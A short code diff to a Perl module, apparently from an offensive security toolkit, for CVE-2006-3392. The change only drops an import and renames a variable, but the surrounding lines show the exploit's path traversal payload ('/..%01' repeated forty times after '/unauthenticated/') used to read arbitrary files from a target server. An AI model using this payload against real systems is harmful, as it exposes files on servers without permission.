@@ -1,7 +1,6 @@
 package Spellbook::Advisory::CVE_2006_3392 {
     use strict;
     use warnings;
-    use Try::Tiny;
     use Spellbook::Core::UserAgent;
     
     sub new {
@@ -20,7 +19,7 @@ package Spellbook::Advisory::CVE_2006_3392 {
                 $target = "https://$target";
             }
             
-            my $ua = Spellbook::Core::UserAgent -> new();
+            my $userAgent = Spellbook::Core::UserAgent -> new();
 
             my $temp      = "/..%01" x 40;
             my $target    = $target . "/unauthenticated/" . $temp . $file;
